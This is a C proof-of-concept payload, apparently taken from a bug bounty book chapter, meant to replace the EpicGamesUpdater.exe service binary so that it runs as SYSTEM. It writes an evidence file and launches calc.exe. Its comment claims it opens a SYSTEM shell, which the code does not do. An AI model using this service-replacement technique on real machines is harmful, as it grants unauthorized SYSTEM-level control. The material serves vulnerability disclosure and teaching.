// Extraído de: LibroBugBounty/cap-20-caso-epic.md
/**
 * Payload para reemplazo de EpicGamesUpdater.exe
 * Se ejecuta como NT AUTHORITY\SYSTEM cuando el servicio arranca.
 * Escribe evidencia y abre una shell SYSTEM.
 */
#include <windows.h>
#include <stdio.h>

int main(void) {
    FILE *f = fopen("C:\\Users\\Public\\epic_lpe_proof.txt", "w");
    if (f) {
        char username[256] = {0};
        DWORD usize = sizeof(username);
        GetUserNameA(username, &usize);

        char exepath[MAX_PATH] = {0};
        GetModuleFileNameA(NULL, exepath, MAX_PATH);

        SYSTEMTIME st;
        GetSystemTime(&st);

        fprintf(f, "=== PROOF OF SYSTEM EXECUTION ===\r\n");
        fprintf(f, "Timestamp: %04d-%02d-%02dT%02d:%02d:%02dZ\r\n",
                st.wYear, st.wMonth, st.wDay,
                st.wHour, st.wMinute, st.wSecond);
        fprintf(f, "Username:  %s\r\n", username);
        fprintf(f, "PID:       %lu\r\n", GetCurrentProcessId());
        fprintf(f, "Process:   %s\r\n", exepath);
        fprintf(f, "Attack:    Service EXE replacement\r\n");
        fprintf(f, "Service:   EpicGamesUpdater (SYSTEM)\r\n");
        fclose(f);
    }
    /* Prueba visual: abrir calc.exe como SYSTEM */
    WinExec("calc.exe", SW_SHOW);
    return 0;
}
